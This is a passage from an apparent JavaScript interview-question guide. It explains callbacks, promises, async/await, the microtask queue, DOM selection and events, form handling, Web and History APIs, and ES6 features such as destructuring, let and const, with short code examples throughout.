// After 1 second: Received: { name: 'John', age: 30 }
```

### Common Use Cases

1. **Asynchronous Operations**: Handling results when operations complete.
    ```javascript
    fs.readFile('file.txt', 'utf8', function(err, data) {
        if (err) {
            console.error(err);
            return;
        }
        console.log(data);
    });
    ```

2. **Event Handlers**: Responding to user interactions.
    ```javascript
    document.getElementById('btn').addEventListener('click', function() {
        console.log('Button clicked!');
    });
    ```

3. **Array Methods**: Processing collections.
    ```javascript
    let numbers = [1, 2, 3, 4, 5];
    numbers.forEach(function(num) {
        console.log(num * 2);
    });
    ```

### Error-First Callbacks

Node.js convention where the first parameter is reserved for errors:

```javascript
function readFileCallback(err, data) {
    if (err) {
        console.error('Error reading file:', err);
        return;
    }
    console.log('File contents:', data);
}
```

### Callback Hell (Pyramid of Doom)

Nested callbacks can lead to difficult-to-read code:

```javascript
getData(function(a) {
    getMoreData(a, function(b) {
        getEvenMoreData(b, function(c) {
            getYetMoreData(c, function(d) {
                console.log(d);
            });
        });
    });
});
```

This problem led to the development of Promises and async/await for better asynchronous code management.

<br>

## 23. What are promises and how do they manage asynchronous code?

A **Promise** is an object representing the eventual completion or failure of an asynchronous operation. It provides a cleaner alternative to callbacks for handling asynchronous code.

### Promise States

A Promise exists in one of three states:

1. **Pending**: Initial state, neither fulfilled nor rejected
2. **Fulfilled**: Operation completed successfully
3. **Rejected**: Operation failed

Once settled (fulfilled or rejected), a Promise cannot change state.

### Creating Promises

```javascript
let promise = new Promise(function(resolve, reject) {
    // Asynchronous operation
    setTimeout(() => {
        let success = true;
        if (success) {
            resolve('Operation successful');
        } else {
            reject('Operation failed');
        }
    }, 1000);
});
```

### Consuming Promises

```javascript
promise
    .then(function(result) {
        console.log(result);  // Handles success
        return 'Next value';
    })
    .then(function(result) {
        console.log(result);  // Chainable
    })
    .catch(function(error) {
        console.error(error);  // Handles errors
    })
    .finally(function() {
        console.log('Cleanup');  // Always executes
    });
```

### Promise Chaining

Promises solve callback hell through chaining:

```javascript
fetchUser()
    .then(user => fetchPosts(user.id))
    .then(posts => fetchComments(posts[0].id))
    .then(comments => {
        console.log('Comments:', comments);
    })
    .catch(error => {
        console.error('Error in chain:', error);
    });
```

### Promise Utility Methods

1. **Promise.all()**: Waits for all promises to resolve (fails if any reject).
    ```javascript
    Promise.all([promise1, promise2, promise3])
        .then(results => {
            console.log(results);  // Array of all results
        });
    ```

2. **Promise.race()**: Resolves/rejects with first settled promise.
    ```javascript
    Promise.race([promise1, promise2])
        .then(result => {
            console.log('First to finish:', result);
        });
    ```

3. **Promise.allSettled()**: Waits for all promises to settle, regardless of outcome.
    ```javascript
    Promise.allSettled([promise1, promise2])
        .then(results => {
            results.forEach(result => {
                console.log(result.status, result.value || result.reason);
            });
        });
    ```

4. **Promise.any()**: Resolves with first fulfilled promise (ignores rejections unless all reject).

### Benefits Over Callbacks

- Better error handling with `.catch()`
- Avoids callback hell through chaining
- More readable and maintainable code
- Better composition with utility methods

<br>

## 24. Explain async/await in JavaScript and how it differs from Promises.

**Async/await** is syntactic sugar built on top of Promises, providing a more synchronous-looking way to write asynchronous code. It makes asynchronous code easier to read and reason about.

### Basic Syntax

```javascript
async function fetchData() {
    try {
        let response = await fetch('https://api.example.com/data');
        let data = await response.json();
        return data;
    } catch (error) {
        console.error('Error:', error);
    }
}

fetchData().then(data => console.log(data));
```

### Key Concepts

1. **async keyword**: Declares an asynchronous function that always returns a Promise.
    ```javascript
    async function example() {
        return 'Hello';  // Automatically wrapped in Promise.resolve()
    }
    
    example().then(result => console.log(result));  // 'Hello'
    ```

2. **await keyword**: Pauses execution until the Promise resolves, then returns the result.
    ```javascript
    async function getData() {
        let result = await someAsyncOperation();
        console.log(result);  // Waits for promise to resolve
    }
    ```

### Differences from Promises

**Promise syntax:**
```javascript
function fetchUserData() {
    return fetch('/user')
        .then(response => response.json())
        .then(user => fetch(`/posts/${user.id}`))
        .then(response => response.json())
        .then(posts => {
            console.log(posts);
            return posts;
        })
        .catch(error => {
            console.error(error);
        });
}
```

**Async/await syntax:**
```javascript
async function fetchUserData() {
    try {
        let response = await fetch('/user');
        let user = await response.json();
        
        let postsResponse = await fetch(`/posts/${user.id}`);
        let posts = await postsResponse.json();
        
        console.log(posts);
        return posts;
    } catch (error) {
        console.error(error);
    }
}
```

### Key Differences

| Aspect | Promises | Async/Await |
|--------|----------|-------------|
| Syntax | Chaining with `.then()` | Sequential, synchronous-looking |
| Error handling | `.catch()` method | try/catch blocks |
| Readability | Can be harder with complex chains | More intuitive and readable |
| Debugging | Can be challenging | Easier with standard debugging tools |
| Underlying mechanism | Native | Built on Promises |

### Error Handling

```javascript
async function handleErrors() {
    try {
        let data = await fetchData();
        let processed = await processData(data);
        return processed;
    } catch (error) {
        if (error.code === 'NETWORK_ERROR') {
            console.error('Network issue');
        } else {
            console.error('Other error:', error);
        }
        throw error;  // Re-throw if needed
    } finally {
        console.log('Cleanup operations');
    }
}
```

### Parallel Execution

Use `Promise.all()` with async/await for concurrent operations:

```javascript
async function fetchMultiple() {
    try {
        // Sequential (slow)
        let user = await fetchUser();
        let posts = await fetchPosts();
        
        // Parallel (fast)
        let [user, posts] = await Promise.all([
            fetchUser(),
            fetchPosts()
        ]);
        
        return { user, posts };
    } catch (error) {
        console.error(error);
    }
}
```

### Important Notes

- `await` can only be used inside `async` functions (or at top-level in modules)
- An `async` function always returns a Promise
- Unhandled promise rejections in async functions can be caught with `.catch()` on the function call

<br>

## 25. What is the Job Queue (or Microtask Queue)?

The **Job Queue** (also called **Microtask Queue**) is a queue that holds microtasks which have higher priority than regular tasks (macrotasks) in the event loop. Microtasks are executed after the current synchronous code completes but before the next macrotask.

### What Are Microtasks?

Microtasks include:
- Promise callbacks (`.then()`, `.catch()`, `.finally()`)
- `queueMicrotask()` API
- MutationObserver callbacks
- `process.nextTick()` in Node.js (even higher priority than microtasks)

### Execution Priority

```javascript
console.log('Start');

setTimeout(() => {
    console.log('Timeout 1');
}, 0);

Promise.resolve()
    .then(() => {
        console.log('Promise 1');
        return Promise.resolve();
    })
    .then(() => {
        console.log('Promise 2');
    });

setTimeout(() => {
    console.log('Timeout 2');
}, 0);

Promise.resolve()
    .then(() => {
        console.log('Promise 3');
    });

console.log('End');

// Output:
// Start
// End
// Promise 1
// Promise 3
// Promise 2
// Timeout 1
// Timeout 2
```

### How It Works

1. Synchronous code executes first (call stack)
2. When call stack is empty, all microtasks in the microtask queue execute
3. After all microtasks complete, one macrotask from the callback queue executes
4. After that macrotask, all new microtasks execute again
5. Process repeats

### Visual Representation

```
Synchronous Code (Call Stack)
        ↓
Microtask Queue (Process ALL)
        ↓
Macrotask Queue (Process ONE)
        ↓
Microtask Queue (Process ALL again)
        ↓
(Repeat)
```

### Practical Example

```javascript
console.log('Script start');

setTimeout(() => {
    console.log('setTimeout');
    Promise.resolve().then(() => {
        console.log('Promise inside setTimeout');
    });
}, 0);

Promise.resolve()
    .then(() => {
        console.log('Promise 1');
        setTimeout(() => {
            console.log('setTimeout inside Promise');
        }, 0);
    })
    .then(() => {
        console.log('Promise 2');
    });

console.log('Script end');

// Output:
// Script start
// Script end
// Promise 1
// Promise 2
// setTimeout
// Promise inside setTimeout
// setTimeout inside Promise
```

### Why This Matters

Understanding the microtask queue is crucial for:
- Predicting execution order in complex asynchronous code
- Avoiding performance issues (microtasks can starve macrotasks)
- Debugging timing-related bugs
- Optimizing asynchronous operations

### Creating Microtasks

```javascript
// Using Promises
Promise.resolve().then(() => {
    console.log('Microtask via Promise');
});

// Using queueMicrotask API
queueMicrotask(() => {
    console.log('Microtask via queueMicrotask');
});
```

<br>

# DOM Manipulation and Browser APIs (26-30)

## 26. How do you select DOM elements using JavaScript?

JavaScript provides multiple methods for selecting DOM elements, each suited for different scenarios.

### Selection Methods

1. **getElementById()**: Selects a single element by its ID attribute.
    ```javascript
    let element = document.getElementById('myId');
    ```

2. **getElementsByClassName()**: Returns a live HTMLCollection of elements with the specified class name.
    ```javascript
    let elements = document.getElementsByClassName('myClass');
    // Returns HTMLCollection (array-like, live)
    console.log(elements[0]);  // Access first element
    ```

3. **getElementsByTagName()**: Returns a live HTMLCollection of elements with the specified tag name.
    ```javascript
    let paragraphs = document.getElementsByTagName('p');
    let allElements = document.getElementsByTagName('*');  // All elements
    ```

4. **querySelector()**: Returns the first element matching a CSS selector.
    ```javascript
    let element = document.querySelector('.myClass');
    let nested = document.querySelector('div .nested-class');
    let byId = document.querySelector('#myId');
    ```

5. **querySelectorAll()**: Returns a static NodeList of all elements matching a CSS selector.
    ```javascript
    let elements = document.querySelectorAll('.myClass');
    // Returns NodeList (array-like, static)
    elements.forEach(el => {
        console.log(el);
    });
    ```

6. **getElementsByName()**: Selects elements by their name attribute.
    ```javascript
    let inputs = document.getElementsByName('username');
    ```

### Modern Selectors (querySelector/querySelectorAll)

These methods accept any valid CSS selector:

```javascript
// Class selector
document.querySelector('.container');

// ID selector
document.querySelector('#header');

// Attribute selector
document.querySelector('[data-id="123"]');

// Complex selectors
document.querySelector('div.container > p:first-child');
document.querySelectorAll('ul li:nth-child(odd)');

// Multiple selectors
document.querySelectorAll('.class1, .class2, #id1');
```

### Selecting from Specific Elements

```javascript
let container = document.getElementById('container');
let childElements = container.querySelectorAll('.child');
```

### Live vs Static Collections

```javascript
// Live collection (updates automatically)
let liveCollection = document.getElementsByClassName('item');
console.log(liveCollection.length);  // 3

document.body.innerHTML += '<div class="item">New</div>';
console.log(liveCollection.length);  // 4 (automatically updated)

// Static collection (snapshot)
let staticCollection = document.querySelectorAll('.item');
console.log(staticCollection.length);  // 3

document.body.innerHTML += '<div class="item">New</div>';
console.log(staticCollection.length);  // Still 3 (not updated)
```

### Best Practices

- Use `getElementById()` for single unique elements (fastest)
- Use `querySelector()` / `querySelectorAll()` for flexibility with CSS selectors
- Avoid `getElementsByClassName()` / `getElementsByTagName()` in modern code (prefer querySelectorAll)
- Cache selections if using them multiple times

<br>

## 27. Explain event propagation in the DOM.

**Event propagation** is the process by which events travel through the DOM tree. It consists of three phases: capturing, target, and bubbling.

### Three Phases of Event Propagation

1. **Capturing Phase (Capture)**: Event travels from the window down to the target element
2. **Target Phase**: Event reaches the target element
3. **Bubbling Phase (Bubble)**: Event bubbles up from the target back to the window

```
Window
  ↓ Capturing
Document
  ↓
<html>
  ↓
<body>
  ↓
<div>
  ↓
<button> ← Target
  ↑
  ↑ Bubbling
  ↑
```

### Code Example

```javascript
<div id="outer">
    <div id="middle">
        <button id="inner">Click Me</button>
    </div>
</div>

<script>
let outer = document.getElementById('outer');
let middle = document.getElementById('middle');
let inner = document.getElementById('inner');

// Bubbling (default, third parameter is false or omitted)
outer.addEventListener('click', () => {
    console.log('Outer bubbling');
}, false);

middle.addEventListener('click', () => {
    console.log('Middle bubbling');
});

inner.addEventListener('click', () => {
    console.log('Inner bubbling');
});

// Capturing (third parameter is true)
outer.addEventListener('click', () => {
    console.log('Outer capturing');
}, true);

// Click on button output:
// Outer capturing
// Inner bubbling
// Middle bubbling
// Outer bubbling
</script>
```

### Event Bubbling

Most events bubble up through the DOM tree. When an event occurs on an element, it first runs handlers on that element, then on its parent, and so on up to the root.

```javascript
document.body.addEventListener('click', () => {
    console.log('Body clicked');
});

document.querySelector('button').addEventListener('click', () => {
    console.log('Button clicked');
});

// Clicking button logs:
// Button clicked
// Body clicked
```

### Stopping Propagation

```javascript
element.addEventListener('click', (event) => {
    event.stopPropagation();  // Stops bubbling
    console.log('This runs, but event won\'t bubble');
});

// stopImmediatePropagation() also stops other handlers on same element
element.addEventListener('click', (event) => {
    event.stopImmediatePropagation();
    console.log('This runs');
});

element.addEventListener('click', () => {
    console.log('This won\'t run');
});
```

### Event Target vs Current Target

```javascript
document.getElementById('parent').addEventListener('click', (event) => {
    console.log('target:', event.target);        // Element that triggered event
    console.log('currentTarget:', event.currentTarget);  // Element with listener
});
```

### Events That Don't Bubble

Some events don't bubble, including:
- `focus` / `blur` (use `focusin` / `focusout` for bubbling versions)
- `load` / `unload`
- `mouseenter` / `mouseleave` (use `mouseover` / `mouseout` for bubbling)

### Practical Use: Event Delegation

Event propagation enables event delegation, where a single handler on a parent manages events for multiple children:

```javascript
document.getElementById('list').addEventListener('click', (event) => {
    if (event.target.tagName === 'LI') {
        console.log('List item clicked:', event.target.textContent);
    }
});
```

<br>

## 28. How do you prevent a form from submitting using JavaScript?

Preventing form submission is commonly needed for client-side validation or AJAX submissions.

### Using preventDefault()

The most common method is calling `preventDefault()` on the submit event:

```javascript
let form = document.getElementById('myForm');
form.addEventListener('submit', function(event) {
    event.preventDefault();  // Prevents default form submission
   
    console.log('Form submission prevented');
    // Perform validation or custom handling here
});
```

### With Form Validation

```javascript
document.getElementById('myForm').addEventListener('submit', function(event) {
    event.preventDefault();
   
    let username = document.getElementById('username').value;
    let email = document.getElementById('email').value;
   
    if (!username || !email) {
        alert('Please fill in all fields');
        return;
    }
   
    if (!isValidEmail(email)) {
        alert('Please enter a valid email');
        return;
    }
   
    // If validation passes, submit via AJAX or allow submission
    this.submit();  // Programmatic submission (won't trigger event listener)
});

function isValidEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}
```

### Using Return False (Inline Handlers)

With inline event handlers, returning `false` prevents submission:

```html
<form onsubmit="return validateForm()">
    <input type="text" id="username" name="username">
    <button type="submit">Submit</button>
</form>

<script>
function validateForm() {
    let username = document.getElementById('username').value;
    let isValid = username.length > 0;
    
    if (!isValid) {
        alert('Username is required');
    }
    
    return isValid;  // false prevents submission
}
</script>
```

### Preventing with Button Type

Use a regular button instead of submit button:

```html
<form id="myForm">
    <input type="text" name="username">
    <button type="button" id="submitBtn">Submit</button>
</form>

<script>
function validateForm() {
    // Add your validation logic
    let username = document.querySelector('input[name="username"]').value;
    return username.length > 0;
}

document.getElementById('submitBtn').addEventListener('click', function() {
    let form = document.getElementById('myForm');
    
    if (validateForm()) {
        // Manually submit if needed
        form.submit();
    }
});
</script>
```

### AJAX Form Submission

```javascript
document.getElementById('myForm').addEventListener('submit', function(event) {
    event.preventDefault();
   
    let formData = new FormData(this);
   
    fetch('/api/submit', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
        // Handle success (e.g., show message, redirect)
    })
    .catch(error => {
        console.error('Error:', error);
    });
});
```

### Removing Event Listener

```javascript
function handleSubmit(event) {
    event.preventDefault();
    console.log('Form submitted');
}

let form = document.getElementById('myForm');
form.addEventListener('submit', handleSubmit);

// Later, to allow normal submission
form.removeEventListener('submit', handleSubmit);
```

### Important Notes

- `event.preventDefault()` must be called before any asynchronous operations complete
- Calling `form.submit()` bypasses the submit event listener and won't trigger the submit event
- If you need event listeners to fire when submitting programmatically, use `form.requestSubmit()` instead of `form.submit()`
- Use `event.preventDefault()` instead of `return false` in modern JavaScript for clarity
- Always validate on the server side as well, never rely solely on client-side validation
- The `return false` approach only works with inline `onsubmit` handlers, not with `addEventListener()`

<br>

## 29. What are Web APIs in the context of JavaScript?

**Web APIs** (Application Programming Interfaces) are browser-provided interfaces that extend JavaScript's capabilities beyond the core language, enabling interaction with the browser and the operating system.

### Common Web APIs

1. **DOM (Document Object Model) API**: Manipulates HTML and CSS.
    ```javascript
    document.getElementById('myElement');
    element.classList.add('active');
    ```

2. **Fetch API**: Makes HTTP requests.
    ```javascript
    fetch('https://api.example.com/data')
        .then(response => response.json())
        .then(data => console.log(data));
    ```

3. **Web Storage API**: localStorage and sessionStorage.
    ```javascript
    localStorage.setItem('user', 'John');
    let user = localStorage.getItem('user');
    ```

4. **Geolocation API**: Accesses user's geographic location.
    ```javascript
    navigator.geolocation.getCurrentPosition(position => {
        console.log(position.coords.latitude, position.coords.longitude);
    });
    ```

5. **Canvas API**: Draws graphics using JavaScript.
    ```javascript
    let canvas = document.getElementById('myCanvas');
    let ctx = canvas.getContext('2d');
    ctx.fillRect(0, 0, 100, 100);
    ```

6. **Web Audio API**: Processes and synthesizes audio.
    ```javascript
    let audioContext = new AudioContext();
    let oscillator = audioContext.createOscillator();
    ```

7. **WebSocket API**: Enables real-time bidirectional communication.
    ```javascript
    let socket = new WebSocket('ws://example.com/socket');
    socket.onmessage = (event) => {
        console.log('Message:', event.data);
    };
    ```

8. **History API**: Manipulates browser history.
    ```javascript
    history.pushState({page: 1}, "title", "?page=1");
    ```

9. **Notification API**: Displays system notifications.
    ```javascript
    new Notification('Hello!', {
        body: 'This is a notification',
        icon: 'icon.png'
    });
    ```

10. **File API**: Reads file contents from user's system.
    ```javascript
    let fileInput = document.querySelector('input[type="file"]');
    fileInput.addEventListener('change', (event) => {
        let file = event.target.files[0];
        let reader = new FileReader();
        reader.onload = (e) => console.log(e.target.result);
        reader.readAsText(file);
    });
    ```

### Additional Web APIs

- **Intersection Observer API**: Detects when elements enter viewport
- **MutationObserver API**: Monitors DOM changes
- **Service Worker API**: Enables offline functionality and background sync
- **WebRTC API**: Real-time communication (video/audio)
- **Payment Request API**: Standardized payment collection
- **Clipboard API**: Interacts with system clipboard
- **Drag and Drop API**: Implements drag-and-drop functionality
- **requestAnimationFrame**: Optimizes animations
- **Console API**: Logging and debugging

### Key Characteristics

- **Browser-Specific**: Not part of JavaScript language itself (ECMAScript)
- **Asynchronous**: Many APIs use callbacks, promises, or events
- **Browser Support**: Varies across browsers; check compatibility
- **Permissions**: Some require user permission (geolocation, notifications, camera)

### Example: Combining Multiple APIs

```javascript
// Using Fetch API and Notification API together
async function fetchAndNotify() {
    try {
        // Request notification permission
        if (Notification.permission === 'default') {
            await Notification.requestPermission();
        }
        
        // Fetch data
        let response = await fetch('https://api.example.com/updates');
        let data = await response.json();
        
        // Show notification
        if (Notification.permission === 'granted') {
            new Notification('New Updates', {
                body: `${data.count} new items available`,
                icon: 'icon.png'
            });
        }
    } catch (error) {
        console.error('Error:', error);
    }
}
```

<br>

## 30. How can you manipulate the browser history using JavaScript?

The **History API** allows manipulation of the browser session history, enabling creation of single-page applications with proper navigation support.

### History Object Methods

1. **history.pushState()**: Adds a new entry to history stack.
    ```javascript
    history.pushState(state, title, url);
    
    // Example
    history.pushState({page: 1}, 'Page 1', '/page1');
    history.pushState({page: 2}, 'Page 2', '/page2');
    ```

2. **history.replaceState()**: Modifies the current history entry.
    ```javascript
    history.replaceState({page: 1}, 'Updated Page 1', '/page1-updated');
    ```

3. **history.back()**: Goes back one page (like browser back button).
    ```javascript
    history.back();
    ```

4. **history.forward()**: Goes forward one page (like browser forward button).
    ```javascript
    history.forward();
    ```

5. **history.go()**: Moves to a specific page in history.
    ```javascript
    history.go(-1);  // Go back one page
    history.go(-2);  // Go back two pages
    history.go(1);   // Go forward one page
    ```

### Listening to History Changes

Use the `popstate` event to detect when user navigates using back/forward buttons:

```javascript
window.addEventListener('popstate', (event) => {
    console.log('Location changed');
    console.log('State:', event.state);
    
    // Update page content based on new URL
    loadContent(location.pathname);
});
```

### Practical Example: Single Page Application

```javascript
// Navigation function
function navigateTo(url, data) {
    // Update history
    history.pushState(data, '', url);
    
    // Load content for new URL
    loadContent(url);
}

// Content loading function
function loadContent(url) {
    let content = document.getElementById('content');
    
    switch(url) {
        case '/home':
            content.innerHTML = '<h1>Home Page</h1>';
            break;
        case '/about':
            content.innerHTML = '<h1>About Page</h1>';
            break;
        case '/contact':
            content.innerHTML = '<h1>Contact Page</h1>';
            break;
        default:
            content.innerHTML = '<h1>404 Not Found</h1>';
    }
}

// Handle link clicks
document.querySelectorAll('a[data-link]').forEach(link => {
    link.addEventListener('click', (event) => {
        event.preventDefault();
        let url = event.target.getAttribute('href');
        navigateTo(url, {page: url});
    });
});

// Handle browser back/forward
window.addEventListener('popstate', (event) => {
    loadContent(location.pathname);
});

// Initial page load
loadContent(location.pathname);
```

### State Object

The state object can hold any serializable data:

```javascript
let state = {
    page: 'products',
    filter: 'electronics',
    sort: 'price-asc',
    timestamp: Date.now()
};

history.pushState(state, '', '/products?filter=electronics&sort=price-asc');

// Access current state
console.log(history.state);
```

### URL Manipulation

```javascript
// Change URL without page reload
history.pushState(null, '', '/new-url');

// Add query parameters
history.pushState(null, '', '?search=javascript&page=1');

// Change hash
history.pushState(null, '', '#section2');
```

### Properties

```javascript
// Get number of entries in history
console.log(history.length);

// Get current state
console.log(history.state);

// Get scroll restoration behavior
console.log(history.scrollRestoration);  // 'auto' or 'manual'
history.scrollRestoration = 'manual';
```

### Best Practices

- Always update page content when calling `pushState()` or `replaceState()`
- Handle `popstate` events to respond to back/forward navigation
- Keep state objects small and serializable
- Use relative URLs when possible
- Ensure server can handle direct access to pushed URLs (for page refreshes)
- Consider accessibility and ensure keyboard navigation works

### Security Considerations

```javascript
// Can only manipulate URLs with same origin
history.pushState(null, '', '/allowed');  // ✓ Same origin

// This would throw a security error:
// history.pushState(null, '', 'https://different-domain.com');  // ✗ Cross-origin
```

<br>

# ES2015+ and Modern JavaScript Features (31-35)

## 31. What are the new features introduced in ES6?

**ES6 (ES2015)** introduced significant enhancements to JavaScript, modernizing the language and improving developer productivity.

### Major ES6 Features

1. **Let and Const**: Block-scoped variable declarations.
    ```javascript
    let mutableVar = 'can change';
    const immutableVar = 'cannot reassign';
    ```

2. **Arrow Functions**: Concise function syntax with lexical `this` binding.
    ```javascript
    const add = (a, b) => a + b;
    const square = x => x * x;
    ```

3. **Template Literals**: String interpolation and multi-line strings.
    ```javascript
    let name = 'John';
    let greeting = `Hello, ${name}!
    Welcome to ES6.`;
    ```

4. **Destructuring**: Extract values from arrays and objects.
    ```javascript
    let [a, b] = [1, 2];
    let {name, age} = {name: 'John', age: 30};
    ```

5. **Default Parameters**: Set default values for function parameters.
    ```javascript
    function greet(name = 'Guest') {
        return `Hello, ${name}`;
    }
    ```

6. **Rest and Spread Operators**: Handle variable arguments and expand iterables.
    ```javascript
    // Rest
    function sum(...numbers) {
        return numbers.reduce((a, b) => a + b, 0);
    }
    
    // Spread
    let arr1 = [1, 2, 3];
    let arr2 = [...arr1, 4, 5];
    ```

7. **Classes**: Syntactic sugar for constructor functions and prototypes.
    ```javascript
    class Person {
        constructor(name) {
            this.name = name;
        }
        greet() {
            return `Hello, ${this.name}`;
        }
    }
    ```

8. **Modules**: Import and export functionality between files.
    ```javascript
    // export
    export const myFunction = () => {};
    export default class MyClass {}
    
    // import
    import MyClass, { myFunction } from './module.js';
    ```

9. **Promises**: Native asynchronous programming support.
    ```javascript
    let promise = new Promise((resolve, reject) => {
        setTimeout(() => resolve('Done'), 1000);
    });
    ```

10. **Enhanced Object Literals**: Shorthand properties and methods.
    ```javascript
    let name = 'John';
    let obj = {
        name,  // Shorthand for name: name
        greet() {  // Shorthand for greet: function()
            return `Hello, ${this.name}`;
        },
        ['computed' + 'Key']: 'value'  // Computed property names
    };
    ```

11. **Iterators and Generators**: Custom iteration behavior.
    ```javascript
    function* idGenerator() {
        let id = 1;
        while (true) {
            yield id++;
        }
    }
    
    let gen = idGenerator();
    console.log(gen.next().value);  // 1
    console.log(gen.next().value);  // 2
    ```

12. **Symbol**: New primitive type for unique identifiers.
    ```javascript
    const sym = Symbol('description');
    let obj = {
        [sym]: 'value'
    };
    ```

13. **Map and Set**: New data structures.
    ```javascript
    let map = new Map();
    map.set('key', 'value');
    
    let set = new Set([1, 2, 3, 3]);  // [1, 2, 3]
    ```

14. **for...of Loop**: Iterate over iterable objects.
    ```javascript
    for (let value of [1, 2, 3]) {
        console.log(value);
    }
    ```

15. **WeakMap and WeakSet**: Garbage collection-friendly collections.
    ```javascript
    let weakMap = new WeakMap();
    let obj = {};
    weakMap.set(obj, 'value');
    ```

### Additional Features

- **Array methods**: `find()`, `findIndex()`, `fill()`, `copyWithin()`
- **String methods**: `startsWith()`, `endsWith()`, `includes()`, `repeat()`
- **Number methods**: `Number.isNaN()`, `Number.isFinite()`, `Number.isInteger()`
- **Object methods**: `Object.assign()`, `Object.is()`, `Object.setPrototypeOf()`
- **Proxy and Reflect**: Meta-programming capabilities
- **Binary and Octal literals**: `0b1010`, `0o755`
- **Unicode improvements**: Better Unicode string handling

<br>

## 32. How do you use destructuring assignments in ES6?

**Destructuring** is a convenient way to extract values from arrays or properties from objects into distinct variables.

### Array Destructuring

```javascript
// Basic array destructuring
let [a, b, c] = [1, 2, 3];
console.log(a, b, c);  // 1 2 3

// Skipping elements
let [first, , third] = [1, 2, 3];
console.log(first, third);  // 1 3

// Rest operator
let [head, ...tail] = [1, 2, 3, 4];
console.log(head);  // 1
console.log(tail);  // [2, 3, 4]

// Default values
let [x = 0, y = 0] = [10];
console.log(x, y);  // 10 0

// Swapping variables
let a = 1, b = 2;
[a, b] = [b, a];
console.log(a, b);  // 2 1
```

### Object Destructuring

```javascript
// Basic object destructuring
let {name, age} = {name: 'John', age: 30};
console.log(name, age);  // John 30

// Renaming variables
let {name: userName, age: userAge} = {name: 'John', age: 30};
console.log(userName, userAge);  // John 30

// Default values
let {name = 'Guest', role = 'User'} = {name: 'John'};
console.log(name, role);  // John User

// Rest operator
let {a, b, ...rest} = {a: 1, b: 2, c: 3, d: 4};
console.log(rest);  // {c: 3, d: 4}

// Nested destructuring
let person = {
    name: 'John',
    address: {
        city: 'New York',
        zip: '10001'
    }
};
let {name, address: {city, zip}} = person;
console.log(city, zip);  // New York 10001
```

### Function Parameters

```javascript
// Array destructuring in parameters
function sum([a, b]) {
    return a + b;
}
console.log(sum([5, 10]));  // 15

// Object destructuring in parameters
function greet({name, age}) {
    return `Hello, ${name}. You are ${age} years old.`;
}
console.log(greet({name: 'John', age: 30}));

// With default values
function createUser({name = 'Guest', role = 'User'} = {}) {
    return {name, role};
}
console.log(createUser());  // {name: 'Guest', role: 'User'}
console.log(createUser({name: 'John'}));  // {name: 'John', role: 'User'}
```

### Practical Examples

```javascript
// Extracting values from function returns
function getCoordinates() {
    return [40.7128, -74.0060];
}
let [latitude, longitude] = getCoordinates();

// Importing specific exports
import {useState, useEffect} from 'react';

// Iterating with destructuring
let users = [
    {name: 'John', age: 30},
    {name: 'Jane', age: 25}
];

for (let {name, age} of users) {
    console.log(`${name} is ${age} years old`);
}

// Working with regex matches
let url = 'https://example.com:8080/path';
let [, protocol, domain, port] = url.match(/^(\w+):\/\/([^:]+):(\d+)/);
console.log(protocol, domain, port);  // https example.com 8080

// Extracting from nested API responses
let response = {
    data: {
        user: {
            id: 123,
            profile: {
                name: 'John',
                email: 'john@example.com'
            }
        }
    }
};

let {data: {user: {profile: {name, email}}}} = response;
console.log(name, email);
```

### Dynamic Property Names

```javascript
let key = 'name';
let {[key]: value} = {name: 'John', age: 30};
console.log(value);  // John
```

### Mixed Destructuring

```javascript
let data = {
    title: 'ES6',
    tags: ['javascript', 'es6', 'destructuring']
};

let {title, tags: [firstTag, ...otherTags]} = data;
console.log(title);       // ES6
console.log(firstTag);    // javascript
console.log(otherTags);   // ['es6', 'destructuring']
```

<br>

## 33. Explain the use of `const` and `let` keywords.

**`let`** and **`const`** are block-scoped variable declarations introduced in ES6, replacing the function-scoped `var` keyword in modern JavaScript.

### let Keyword

`let` declares a block-scoped variable that can be reassigned.

```javascript
let count = 0;
count = 1;  // ✓ Can reassign

if (true) {
    let blockScoped = 'inside block';
    console.log(blockScoped);  // ✓ Accessible here
}
console.log(blockScoped);  // ✗ ReferenceError: not defined
```

### const Keyword

`const` declares a block-scoped variable that cannot be reassigned (the binding is immutable, not the value).

```javascript
const PI = 3.14159;
PI = 3.14;  // ✗ TypeError: Assignment to constant variable

const person = {name: 'John'};
person.name = 'Jane';  // ✓ Object properties can be modified
person = {};  // ✗ TypeError: Cannot reassign
```

### Key Differences from var

| Feature | var | let | const |
|---------|-----|-----|-------|
| Scope | Function | Block | Block |
| Hoisting | Yes (initialized as undefined) | Yes (not initialized) | Yes (not initialized) |
| Reassignment | Yes | Yes | No |
| Redeclaration | Yes | No | No |
| Temporal Dead Zone | No | Yes | Yes |

### Block Scoping

```javascript
// var is function-scoped
function varExample() {
    if (true) {
        var x = 10;
    }
    console.log(x);  // 10 (accessible outside block)
}

// let/const are block-scoped
function letExample() {
    if (true) {
        let y = 10;
    }
    console.log(y);  // ReferenceError
}
```

### Temporal Dead Zone (TDZ)

Variables declared with `let` and `const` are hoisted but not initialized, creating a "temporal dead zone" from the start of the block until the declaration.

```javascript
console.log(varVariable);  // undefined (hoisted)
var varVariable = 'var';

console.log(letVariable);  // ReferenceError (TDZ)
let letVariable = 'let';

console.log(constVariable);  // ReferenceError (TDZ)
const constVariable = 'const';
```

### Loop Behavior

```javascript
// var creates one variable shared across iterations
for (var i = 0; i < 3; i++) {
    setTimeout(() => console.log(i), 100);
}
// Output: 3 3 3

// let creates a new variable for each iteration
for (let i = 0; i < 3; i++) {
    setTimeout(() => console.log(i), 100);
}
// Output: 0 1 2
```

### const with Objects and Arrays

```javascript
// const prevents reassignment, not mutation
const arr = [1, 2, 3];
arr.push(4);  // ✓ Allowed
arr[0] = 10;  // ✓ Allowed
arr = [];     // ✗ TypeError

const obj = {name: 'John'};
obj.name = 'Jane';  // ✓ Allowed
obj.age = 30;       // ✓ Allowed
obj = {};          // ✗ TypeError

// To make objects/arrays truly immutable
const frozenObj = Object.freeze({name: 'John'});
frozenObj.name = 'Jane';  // Fails silently (strict mode throws error)
```

### Best Practices

1. **Prefer `const` by default**: Use `const` for values that won't be reassigned.
    ```javascript
    const MAX_USERS = 100;
    const API_URL = 'https://api.example.com';
    ```

2. **Use `let` when reassignment is needed**: For loop counters, accumulators, etc.
    ```javascript
    let total = 0;
    for (let i = 0; i < items.length; i++) {
        total += items[i];
    }
    ```

3. **Avoid `var`**: In modern JavaScript, there's rarely a reason to use `var`.

4. **Declare at the top of scope**: Keep declarations visible and avoid TDZ issues.

### Redeclaration Errors

```javascript
// var allows redeclaration
var x = 1;
